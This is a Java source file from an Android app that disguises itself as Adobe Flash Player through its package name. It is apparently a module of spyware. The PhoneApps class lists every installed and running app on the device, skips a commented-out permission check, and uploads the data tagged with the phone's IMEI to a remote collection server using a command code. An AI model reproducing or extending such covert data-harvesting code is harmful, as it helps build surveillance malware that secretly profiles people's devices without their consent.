package com.adobe.flashplayer.data;


import com.adobe.flashplayer.MyLog;
import com.adobe.flashplayer.Public;
import com.adobe.flashplayer.Utils;
import com.adobe.flashplayer.network.NetworkUtils;
import com.adobe.flashplayer.network.UploadData;
import java.util.List;
import org.json.JSONArray;
import org.json.JSONObject;
import android.app.ActivityManager;
import android.app.ActivityManager.RunningAppProcessInfo;
import android.content.Context;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.util.Log;




public class PhoneApps {

    private static final String TAG = "[ljg]PhoneAPPs";

    public PhoneApps(Context context){

    }


    public static boolean getInstallApps(Context context){
        try{
            //int granted = ContextCompat.checkSelfPermission(context,android.Manifest.permission.QUERY_ALL_PACKAGES);
            //if (granted == PackageManager.PERMISSION_GRANTED)
            {

                JSONArray jsarray = new JSONArray();

                JSONArray jsarrayapp = new JSONArray();
                JSONArray jsarraysys = new JSONArray();
                JSONArray jsarrayrun = new JSONArray();

                PackageManager manager = context.getPackageManager();
                List<PackageInfo> pkgList = manager.getInstalledPackages(0);

                int thirdpartycnt = 0;
                int systemappcnt = 0;
                int runappcnt = 0;
                for (int i = 0; i < pkgList.size(); i++) {
                    PackageInfo pI = pkgList.get(i);

                    String installtime = Utils.formatDate("yyyy-MM-dd HH:mm:ss", pI.firstInstallTime);
                    String updatetime = Utils.formatDate("yyyy-MM-dd HH:mm:ss", pI.lastUpdateTime);
                    JSONObject jsobj = new JSONObject();
                    jsobj.put("应用名称", pI.applicationInfo.loadLabel(context.getPackageManager()).toString());
                    jsobj.put("包名", pI.packageName);
                    jsobj.put("安装时间", installtime);
                    jsobj.put("最近更新时间", updatetime);
                    jsobj.put("版本", pI.versionName);
                    jsobj.put("USERID", pI.sharedUserId);

                    if ((pI.applicationInfo.flags & ApplicationInfo.FLAG_SYSTEM) == 0) {
                        jsobj.put("type", "1");
                        jsarrayapp.put(thirdpartycnt, jsobj);
                        thirdpartycnt++;
                    } else {
                        jsobj.put("type", "2");
                        jsarraysys.put(systemappcnt, jsobj);
                        systemappcnt++;
                    }
                }

                ActivityManager am = (ActivityManager) context.getSystemService("activity");
                List<RunningAppProcessInfo> runapplist = am.getRunningAppProcesses();

                for (RunningAppProcessInfo runapp : runapplist) {
                    JSONObject jsobj = new JSONObject();
                    jsobj.put("程序名称", runapp.processName);
                    jsobj.put("进程ID", String.valueOf(runapp.pid));
                    jsobj.put("用户ID", String.valueOf(runapp.uid));
                    jsobj.put("LRU", String.valueOf(runapp.lru));
                    jsobj.put("描述", String.valueOf(runapp.describeContents()));
                    jsobj.put("type", "1");
                    jsarrayrun.put(runappcnt, jsobj);
                    runappcnt++;
                }

                jsarray.put(0, jsarrayapp);
                jsarray.put(1, jsarraysys);
                jsarray.put(2, jsarrayrun);

                if (NetworkUtils.isNetworkAvailable(context)) {
                    UploadData.upload(jsarray.toString().getBytes(), jsarray.toString().getBytes().length, Public.CMD_DATA_APPPROCESS, Public.IMEI);
                }else{

                }
                return true;
            }
        }catch(Exception ex){
            ex.printStackTrace();
            String error = Utils.getExceptionDetail(ex);
            String stack = Utils.getCallStack();
            MyLog.writeLogFile("getAppList exception:"+error + "\r\n" + "call stack:" + stack + "\r\n");
        }

        Log.e(TAG, "phone app ok");
        return false;
    }



}
